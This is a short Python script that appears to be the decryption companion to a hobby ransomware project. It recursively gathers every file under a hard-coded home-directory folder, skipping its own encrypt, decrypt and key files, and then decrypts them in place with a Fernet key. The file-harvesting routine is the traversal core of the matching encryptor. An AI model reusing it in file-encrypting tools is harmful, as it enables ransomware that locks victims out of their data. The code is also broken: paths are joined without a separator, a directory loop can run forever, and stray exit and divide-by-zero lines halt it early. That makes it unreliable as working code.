import os
from cryptography.fernet import Fernet

files = []
current = os.path.abspath(os.path.curdir)
#print(os.path.abspath(os.path.curdir))
#exit()
def come_back(directory):
    global current
    print(current, directory)
    while True:
        if current == directory:
            return None
        os.chdir("..")
        current = os.path.abspath(os.path.curdir)
        #print()
        #print("current")
        #print(current)
        #print()


original = "/home/mike234/Desktop/ransom_origin"
come_back(original)


def rec_add(directory):
    global original
    global files
    try:
        os.chdir(directory)
    except PermissionError:
        return None
    directories = []
    try:
        for file in os.listdir():
            if file == "encr.py" or file == "decr.py" or file == "thekey.key":
                pass
            elif os.path.isdir(file):
                directories.append(file)
            else:
                files.append(os.path.abspath(os.path.curdir) + file)
    except PermissionError:
        pass
    for direct in directories:
        rec_add(direct)
    if os.path.abspath(os.path.curdir) != original:
        os.chdir("..")

rec_add(current)
print()
print(files)

exit() ##stop right here
print(1 / 0) ##stop right here
print(1 / 0) ##stop right here

with open(original + "/thekey.key", "rb") as thekey:
    key = thekey.read()
for encr_file in files:
    with open(encr_file, "rb") as e_file:
        content = e_file.read()
    encrypted = Fernet(key).decrypt(content)
    with open(encr_file, "wb") as file1:
         file1.write(encrypted)





